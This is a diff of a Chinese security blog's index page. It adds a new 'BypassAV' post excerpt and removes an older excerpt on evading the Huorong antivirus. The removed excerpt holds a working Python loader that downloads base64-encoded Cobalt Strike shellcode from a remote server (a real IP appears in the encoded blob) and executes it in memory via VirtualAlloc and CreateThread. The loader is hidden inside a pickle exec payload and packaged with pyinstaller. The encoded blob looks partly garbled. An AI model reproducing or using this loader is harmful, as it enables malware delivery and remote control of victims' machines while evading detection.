@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610679634635.css">
+<link rel="stylesheet" href="/css/style.css?v=1610797321827.css">
 
     <!--[if lt IE 9]>
     
@@ -116,6 +116,56 @@
     <header>
         <!-- 标签这有且只能显示一个 -->
         
+        <a class="cat-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/16/BypassAV/">
+    		BypassAV
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2021-01-16T11:38:04.000Z">2021-01-16</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                对shellcode进行base64编码,将编码后的shellcode放入服务器目录下,将地址复制下来，粘贴到下方代码中
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/16/BypassAV/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/16/BypassAV/" title="BypassAV">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/6.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
             <a href="javascript: void(0);" class="cat">未分类</a>
         
         <!-- 文章标题 -->
@@ -159,64 +209,6 @@
             <a href="https://givemefivw.github.io/2020/12/24/ShellterBypass/" title="Shellter结合Virbox Protector Bypass火绒&amp;360">
                 
                     <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/4.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2020/12/23/bypassav/">
-    		BypassAv完美过火绒
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2020-12-23T12:12:03.548Z">2020-12-23</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h2 id="思路来源："><a href="#思路来源：" class="headerlink" title="思路来源："></a>思路来源：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.sec-in.com&#x2F;article&#x2F;733</span><br></pre></td></tr></table></figure>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1.先用CS生成一个python的payload:<br><img src="/2020/12/23/bypassav/1.png"><br>2.将生成的payload打开，复制里面的shellcode，对shellcode进行base64编码<br><img src="/2020/12/23/bypassav/2.png"><br>3.将编码后的shellcode放入服务器目录下，访问<br><img src="/2020/12/23/bypassav/3.png"><br>出现shellcode即证明正常。<br>4.将地址复制下来，粘贴到下方代码中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;&quot;&quot;</span><br><span class="line">import ctypes,urllib.request,codecs,base64</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; urllib.request.urlopen(&#39;http:&#x2F;&#x2F;host&#x2F;test.txt&#39;).read()</span><br><span class="line">shellcode &#x3D; base64.b64decode(shellcode)</span><br><span class="line">shellcode &#x3D;codecs.escape_decode(shellcode)[0]</span><br><span class="line">shellcode &#x3D; bytearray(shellcode)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="line"></span><br><span class="line"># 放入shellcode</span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="line">handle &#x3D; ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.c_int(0), </span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="line">)</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec, (shellcode,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret &#x3D; pickle.dumps(A())</span><br><span class="line">ret_base64 &#x3D; base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br><span class="line">#ret_decode &#x3D; base64.b64decode(ret_base64)</span><br></pre></td></tr></table></figure>
-<p>运行此脚本，不出意外的话会得到以下数据：<br><img src="/2020/12/23/bypassav/4.png"><br>5.接下来，再把刚才得到的数据粘贴到如下代码中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64,pickle,ctypes,urllib.request</span><br><span class="line">shellcode &#x3D; b&#39;gANjYnVpbHRpbnMKZXhlYwpxAFgxBAAACmltcG9ydCBjdHlwZXMsdXJsbGliLnJlcXVlc3QsY29kZWNzLGJhc2U2NAoKc2hlbGxjb2RlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovLzguMTMxLjc5LjE2Ni90ZXN0LnR4dCcpLnJlYWQoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCnNoZWxsY29kZSA9IGJ5dGVhcnJheShzaGVsbGNvZGUpCbypassav6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQoKIyDmlL7lhaVzaGVsbGNvZGUKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCbypassav5Yib5bu65LiA5Liq57q&#x2F;56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i&#x2F;kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSlxAYVxAlJxAy4&#x3D;&#39;</span><br><span class="line">pickle.loads(base64.b64decode(shellcode))</span><br></pre></td></tr></table></figure>
-<p>6.在Windows机器中运行此脚本<br><img src="/2020/12/23/bypassav/5.png"><br>此时再看CS，成功上线！<br><img src="/2020/12/23/bypassav/6.png"><br>7.用pyinstaller将此脚本生成exe文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F 2.py</span><br></pre></td></tr></table></figure>
-<p>看着确实有点大。。。<br><img src="/2020/12/23/bypassav/7.png"><br>再看CS<br><img src="/2020/12/23/bypassav/8.png"><br>看下后台进程<br><img src="/2020/12/23/bypassav/9.png"><br>这时是开着火绒的，完美过了！</p>
-
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2020/12/23/bypassav/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2020/12/23/bypassav/" title="BypassAv完美过火绒">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/3.jpg" alt="默认配图" >
                 
             </a>
         </div>
@@ -462,6 +454,11 @@
         <span class="badge">(3)</span>
     </li>
     
+    <li>
+        <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        <span class="badge">(1)</span>
+    </li>
+    
 </ul>
     </section>
 
@@ -521,7 +518,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610679634636.js"></script>
+<script src="/js/main.js?v=1610797321829.js"></script>
 
 
 </body>
